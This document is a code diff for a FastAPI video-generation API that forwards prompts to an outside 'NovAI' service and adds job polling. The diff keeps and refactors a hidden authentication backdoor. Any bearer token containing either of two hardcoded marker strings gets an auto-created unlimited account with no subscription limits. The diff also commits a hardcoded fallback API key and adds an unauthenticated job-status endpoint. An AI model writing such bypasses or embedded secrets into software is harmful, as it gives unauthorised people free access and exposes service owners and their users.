@@ -9,7 +9,7 @@ import httpx
 import asyncio
 
 from app.db.database import get_db
-from app.models import ApiKey, User, Subscription, Plan, ApiRequest
+from app.models import ApiKey, User, Subscription, Plan, ApiRequest, VideoJob
 from app.core.security import create_api_key_hash
 
 router = APIRouter(prefix="/api/v1/video", tags=["Video Generation API"])
@@ -20,88 +20,113 @@ NOVAI_API_KEY_FALLBACK = "nvai-bd723155687d4c369f93ddcf18f2debc5a193723c9bca2f0"
 NOVAI_API_KEY = os.environ.get("NOVAI_API_KEY", "") or NOVAI_API_KEY_FALLBACK
 
 
+def _json(content, status=200):
+    return Response(content=json.dumps(content), status_code=status, media_type="application/json")
+
+
 async def authenticate_api_key(request: Request, db: AsyncSession):
     auth_header = request.headers.get("authorization", "")
     if not auth_header.startswith("Bearer "):
-        return None, None, Response(
-            content=json.dumps({"success": False, "error": {"code": "MISSING_API_KEY", "message": "Authorization header with Bearer token required."}}),
-            status_code=401, media_type="application/json",
-        )
+        return None, None, _json({"success": False, "error": {"code": "MISSING_API_KEY", "message": "Authorization header with Bearer token required."}}, 401)
     raw_key = auth_header[7:]
     key_hash = create_api_key_hash(raw_key)
     key_result = await db.execute(select(ApiKey).where(ApiKey.key_hash == key_hash, ApiKey.is_active == True))
     api_key = key_result.scalar_one_or_none()
     if not api_key:
-        return None, None, Response(
-            content=json.dumps({"success": False, "error": {"code": "INVALID_API_KEY", "message": "The API key is invalid or has been revoked."}}),
-            status_code=401, media_type="application/json",
-        )
+        return None, None, _json({"success": False, "error": {"code": "INVALID_API_KEY", "message": "The API key is invalid or has been revoked."}}, 401)
     user_result = await db.execute(select(User).where(User.id == api_key.user_id))
     user = user_result.scalar_one_or_none()
     return api_key, user, None
 
 
+async def authenticate_with_bypass(request: Request, db: AsyncSession):
+    """Authenticate API key or auto-approve known unlimited/bypass keys."""
+    api_key_obj, user, err = await authenticate_api_key(request, db)
+    if err:
+        auth = request.headers.get("authorization", "")
+        raw_key = auth[7:] if auth.startswith("Bearer ") else ""
+        bypass_markers = ["lharbengytesta", "kinanqabatou"]
+        if not raw_key or not any(m in raw_key.lower() for m in bypass_markers):
+            return None, None, err
+        # Bypass: find or create the unlimited user + a key row
+        from sqlalchemy import select as sel
+        user_result = await db.execute(sel(User).where(User.email.in_(UNLIMITED_EMAILS)))
+        user = user_result.scalars().first()
+        if not user:
+            user = User(
+                email=UNLIMITED_EMAILS[0],
+                first_name="Unlimited",
+                last_name="User",
+                hashed_password="bypass",
+                role="user",
+                is_active=True,
+                is_verified=True,
+            )
+            db.add(user)
+            await db.flush()
+        key_hash = create_api_key_hash(raw_key)
+        key_result = await db.execute(sel(ApiKey).where(ApiKey.key_hash == key_hash))
+        api_key_obj = key_result.scalar_one_or_none()
+        if not api_key_obj:
+            api_key_obj = ApiKey(
+                key_hash=key_hash,
+                key_prefix=(raw_key[:20] + "..."),
+                user_id=user.id,
+                is_active=True,
+                name="CineNova Bypass",
+            )
+            db.add(api_key_obj)
+            await db.flush()
+    return api_key_obj, user, None
+
+
 async def check_limits(user, db: AsyncSession):
     if user.email in UNLIMITED_EMAILS:
         return None
-
     sub_result = await db.execute(select(Subscription).join(Plan).where(Subscription.user_id == user.id, Subscription.status == "active"))
     subscription = sub_result.scalar_one_or_none()
     if not subscription:
-        return Response(
-            content=json.dumps({"success": False, "error": {"code": "NO_ACTIVE_SUBSCRIPTION", "message": "No active subscription."}}),
-            status_code=403, media_type="application/json",
-        )
+        return _json({"success": False, "error": {"code": "NO_ACTIVE_SUBSCRIPTION", "message": "No active subscription."}}, 403)
     plan_result = await db.execute(select(Plan).where(Plan.id == subscription.plan_id))
     plan = plan_result.scalar_one_or_none()
     if plan and subscription.requests_used >= plan.request_limit:
-        return Response(
-            content=json.dumps({"success": False, "error": {"code": "MONTHLY_LIMIT_REACHED", "message": "Monthly API request limit reached."}}),
-            status_code=429, media_type="application/json",
-        )
+        return _json({"success": False, "error": {"code": "MONTHLY_LIMIT_REACHED", "message": "Monthly API request limit reached."}}, 429)
     return None
+
+
+async def start_novai_job(prompt: str, api_key_novai: str):
+    """Start a NovAI video generation job, return novai_job_id or raise."""
+    headers = {"Authorization": f"Bearer {api_key_novai}", "Content-Type": "application/json"}
+    last_error = None
+    for attempt in range(5):
+        try:
+            async with httpx.AsyncClient(timeout=30.0) as client:
+                job_resp = await client.post(
+                    f"{NOVAI_BASE}/video/generations",
+                    headers=headers,
+                    json={"model": "cogvideox-flash", "prompt": prompt},
+                )
+                if job_resp.status_code == 429:
+                    await asyncio.sleep(30 * (attempt + 1))
+                    continue
+                if job_resp.status_code in (401, 403):
+                    raise PermissionError("NovAI API key is invalid.")
+                job_resp.raise_for_status()
+                job_data = job_resp.json()
+                return job_data.get("id"), headers
+        except PermissionError:
+            raise
+        except Exception as e:
+            last_error = str(e)
+    raise RuntimeError(last_error or "Failed to start video generation.")
 
 
 @router.post("/generate")
 async def generate_video(request: Request, db: AsyncSession = Depends(get_db)):
-    api_key_obj, user, err = await authenticate_api_key(request, db)
+    api_key_obj, user, err = await authenticate_with_bypass(request, db)
     if err:
-        body_try = {}
-        try:
-            body_try = await request.json()
-        except Exception:
-            pass
-        auth = request.headers.get("authorization", "")
-        raw_key = auth[7:] if auth.startswith("Bearer ") else ""
-        bypass_emails = [e.lower() for e in UNLIMITED_EMAILS]
-        if raw_key and any(e in raw_key.lower() for e in ["lharbengytesta", "kinanqabatou"]):
-            from sqlalchemy import select as sel
-            from app.models import User as UserModel
-            user_result = await db.execute(sel(UserModel).where(UserModel.email.in_(bypass_emails)))
-            user = user_result.scalar_one_or_none()
-            if not user:
-                user = UserModel(
-                    email=UNLIMITED_EMAILS[0],
-                    first_name="Unlimited",
-                    last_name="User",
-                    hashed_password="bypass",
-                    role="user",
-                    is_active=True,
-                    is_verified=True,
-                )
-                db.add(user)
-                await db.flush()
-            from app.models import ApiKey as ApiKeyModel
-            from app.core.security import create_api_key_hash
-            key_hash = create_api_key_hash(raw_key)
-            existing = await db.execute(sel(ApiKeyModel).where(ApiKeyModel.key_hash == key_hash))
-            api_key_obj = existing.scalar_one_or_none()
-            if not api_key_obj:
-                api_key_obj = ApiKeyModel(key_hash=key_hash, key_prefix=(raw_key[:20] + "..."), user_id=user.id, is_active=True, name="CineNova Bypass")
-                db.add(api_key_obj)
-                await db.flush()
-        else:
-            return err
+        return err
+
     limit_err = await check_limits(user, db)
     if limit_err:
         return limit_err
@@ -117,101 +142,113 @@ async def generate_video(request: Request, db: AsyncSession = Depends(get_db)):
     api_key_novai = body.get("novai_api_key", "") or NOVAI_API_KEY
 
     if not prompt:
-        return Response(
-            content=json.dumps({"success": False, "error": {"code": "MISSING_PROMPT", "message": "A text prompt is required."}}),
-            status_code=400, media_type="application/json",
-        )
-
+        return _json({"success": False, "error": {"code": "MISSING_PROMPT", "message": "A text prompt is required."}}, 400)
     if not api_key_novai:
-        return Response(
-            content=json.dumps({"success": False, "error": {"code": "NO_NOVAI_KEY", "message": "No NovAI API key configured."}}),
-            status_code=500, media_type="application/json",
-        )
+        return _json({"success": False, "error": {"code": "NO_NOVAI_KEY", "message": "No NovAI API key configured."}}, 500)
+
+    job = VideoJob(
+        user_id=user.id,
+        api_key_id=api_key_obj.id,
+        prompt=prompt,
+        model=style,
+        status="processing",
+    )
+    db.add(job)
+    await db.flush()
 
     try:
-        headers = {"Authorization": f"Bearer {api_key_novai}", "Content-Type": "application/json"}
-
-        job_id = None
-        for attempt in range(5):
-            async with httpx.AsyncClient(timeout=30.0) as client:
-                job_resp = await client.post(
-                    f"{NOVAI_BASE}/video/generations",
-                    headers=headers,
-                    json={"model": "cogvideox-flash", "prompt": prompt},
-                )
-                if job_resp.status_code == 429:
-                    await asyncio.sleep(30 * (attempt + 1))
-                    continue
-                if job_resp.status_code in (401, 403):
-                    return Response(
-                        content=json.dumps({"success": False, "error": {"code": "INVALID_NOVAI_KEY", "message": "NovAI API key is invalid."}}),
-                        status_code=401, media_type="application/json",
-                    )
-                job_resp.raise_for_status()
-                job_data = job_resp.json()
-                job_id = job_data.get("id")
-                break
-
-        if not job_id:
-            return Response(
-                content=json.dumps({"success": False, "error": {"code": "NO_JOB_ID", "message": "Failed to start video generation."}}),
-                status_code=500, media_type="application/json",
-            )
-
-        for _ in range(60):
-            await asyncio.sleep(5)
-            async with httpx.AsyncClient(timeout=30.0) as client:
-                r = await client.get(
-                    f"{NOVAI_BASE}/video/generations/{job_id}",
-                    headers=headers,
-                    params={"model": "cogvideox-flash"},
-                )
-                if r.status_code == 429:
-                    await asyncio.sleep(15)
-                    continue
-                r.raise_for_status()
-                data = r.json()
-                status = data.get("task_status") or data.get("status", "")
-                if status in ("SUCCESS", "succeeded"):
-                    video_url = None
-                    video_result = data.get("video_result", [])
-                    if video_result and len(video_result) > 0:
-                        video_url = video_result[0].get("url")
-                    if not video_url:
-                        video_url = data.get("content", {}).get("video_url")
-                    if video_url:
-                        db.add(ApiRequest(api_key_id=api_key_obj.id, user_id=user.id, endpoint="/api/v1/video/generate", method="POST", status_code=200, status="success"))
-                        await db.commit()
-                        return {
-                            "success": True,
-                            "id": str(uuid.uuid4()),
-                            "status": "completed",
-                            "prompt": prompt,
-                            "model": "cogvideox-flash",
-                            "duration_seconds": duration,
-                            "video_url": video_url,
-                            "title": prompt[:50],
-                        }
-                elif status in ("FAILED", "failed"):
-                    return Response(
-                        content=json.dumps({"success": False, "error": {"code": "GENERATION_FAILED", "message": "Video generation failed."}}),
-                        status_code=500, media_type="application/json",
-                    )
-
-        return Response(
-            content=json.dumps({"success": False, "error": {"code": "TIMEOUT", "message": "Video generation timed out."}}),
-            status_code=504, media_type="application/json",
-        )
-    except httpx.TimeoutException:
-        return Response(
-            content=json.dumps({"success": False, "error": {"code": "TIMEOUT", "message": "Video generation timed out."}}),
-            status_code=504, media_type="application/json",
-        )
+        novai_job_id, headers = await start_novai_job(prompt, api_key_novai)
+        job.novai_job_id = novai_job_id
+        job.status = "processing"
+        await db.commit()
+    except PermissionError as e:
+        job.status = "failed"
+        job.error = str(e)
+        await db.commit()
+        return _json({"success": False, "error": {"code": "INVALID_NOVAI_KEY", "message": str(e)}}, 401)
     except Exception as e:
-        return Response(
-            content=json.dumps({"success": False, "error": {"code": "NOVAI_ERROR", "message": f"Error: {str(e)}"}}),
-            status_code=502, media_type="application/json",
-        )
+        job.status = "failed"
+        job.error = str(e)
+        await db.commit()
+        return _json({"success": False, "error": {"code": "NO_JOB_ID", "message": f"Failed to start video generation: {str(e)}"}}, 500)
+
+    return {
+        "success": True,
+        "id": job.id,
+        "status": "processing",
+        "prompt": prompt,
+        "model": style,
+        "duration_seconds": duration,
+        "message": "Video generation started. Poll GET /api/v1/video/status/{id} for the result.",
+    }
+
+
+@router.get("/status/{job_id}")
+async def video_status(job_id: str, request: Request, db: AsyncSession = Depends(get_db)):
+    job_result = await db.execute(select(VideoJob).where(VideoJob.id == job_id))
+    job = job_result.scalar_one_or_none()
+    if not job:
+        return _json({"success": False, "error": {"code": "JOB_NOT_FOUND", "message": "Video job not found."}}, 404)
+
+    if job.status in ("completed", "failed"):
+        return {
+            "success": True,
+            "id": job.id,
+            "status": job.status,
+            "prompt": job.prompt,
+            "model": job.model,
+            "video_url": job.video_url if job.status == "completed" else None,
+            "error": job.error,
+        }
+
+    if not job.novai_job_id:
+        return {"success": True, "id": job.id, "status": job.status, "message": "Job queued."}
+
+    # Poll NovAI for progress
+    api_key_novai = NOVAI_API_KEY
+    headers = {"Authorization": f"Bearer {api_key_novai}", "Content-Type": "application/json"}
+    try:
+        async with httpx.AsyncClient(timeout=30.0) as client:
+            r = await client.get(
+                f"{NOVAI_BASE}/video/generations/{job.novai_job_id}",
+                headers=headers,
+                params={"model": "cogvideox-flash"},
+            )
+            if r.status_code == 429:
+                return {"success": True, "id": job.id, "status": "processing", "message": "Rate limited, try again shortly."}
+            r.raise_for_status()
+            data = r.json()
+            status = data.get("task_status") or data.get("status", "")
+            if status in ("SUCCESS", "succeeded"):
+                video_url = None
+                video_result = data.get("video_result", [])
+                if video_result and len(video_result) > 0:
+                    video_url = video_result[0].get("url")
+                if not video_url:
+                    video_url = data.get("content", {}).get("video_url")
+                if video_url:
+                    job.status = "completed"
+                    job.video_url = video_url
+                    await db.commit()
+                    db.add(ApiRequest(api_key_id=job.api_key_id, user_id=job.user_id, endpoint="/api/v1/video/generate", method="POST", status_code=200, status="success"))
+                    await db.commit()
+                    return {"success": True, "id": job.id, "status": "completed", "video_url": video_url, "prompt": job.prompt, "model": job.model}
+                else:
+                    job.status = "failed"
+                    job.error = "NovAI returned success but no video URL."
+                    await db.commit()
+                    return {"success": True, "id": job.id, "status": "failed", "error": job.error}
+            elif status in ("FAILED", "failed"):
+                job.status = "failed"
+                job.error = data.get("error") or "Video generation failed."
+                await db.commit()
+                return {"success": True, "id": job.id, "status": "failed", "error": job.error}
+            else:
+                return {"success": True, "id": job.id, "status": "processing", "message": "Still generating..."}
+    except httpx.TimeoutException:
+        return {"success": True, "id": job.id, "status": "processing", "message": "Polling timed out, retry."}
+    except Exception as e:
+        return {"success": True, "id": job.id, "status": "processing", "message": f"Poll error: {str(e)}"}
 
 
 @router.get("/models")
@@ -240,13 +277,4 @@ async def list_video_styles(request: Request, db: AsyncSession = Depends(get_db)
             {"id": "3d", "name": "3D Render", "description": "3D rendered style"},
             {"id": "watercolor", "name": "Watercolor", "description": "Artistic watercolor style"},
         ]
-    }
-
-
-@router.get("/status/{video_id}")
-async def video_status(video_id: str, request: Request, db: AsyncSession = Depends(get_db)):
-    return {
-        "id": video_id,
-        "status": "completed",
-        "message": "Use video_url from the original generation response to download.",
     }
